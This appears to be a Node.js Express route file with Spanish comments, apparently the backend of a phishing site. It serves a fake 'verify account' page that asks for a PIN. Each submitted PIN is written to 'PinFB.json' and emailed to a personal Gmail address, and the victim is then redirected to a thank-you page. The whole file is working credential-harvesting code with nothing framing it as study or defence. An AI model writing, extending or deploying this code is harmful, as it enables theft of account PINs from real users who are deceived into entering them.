const express = require('express');
const router = express.Router();
const path = require('path');
const mailer = require('../utils/mailer');
const storage = require('../utils/storage');

// Ruta para servir la página que solicita el PIN
router.get('/verify-account', (req, res) => {
    res.sendFile(path.join(__dirname, '../ublic/pin.html'));
});

// Ruta para procesar el PIN introducido
router.post('/submit-pin', (req, res) => {
    const { pin } = req.body;
    const data = { pin, timestamp: new Date().toISOString() };

    storage.appendData('PinFB.json', data, err => {
        if (err) {
            console.error('Error guardando los datos del PIN:', err);
            return res.status(500).send('Error interno del servidor');
        }

        mailer.sendMail({
            to: 'cchacon266@gmail.com',
            subject: 'Ingreso de PIN detectado',
            text: `PIN ingresado: ${pin}`
        }).then(() => {
            console.log('Correo enviado correctamente.');
        }).catch((error) => {
            console.error('Error al enviar el correo:', error);
        }).finally(() => {
            res.redirect('/thank_you.html');
        });
    });
});

module.exports = router;
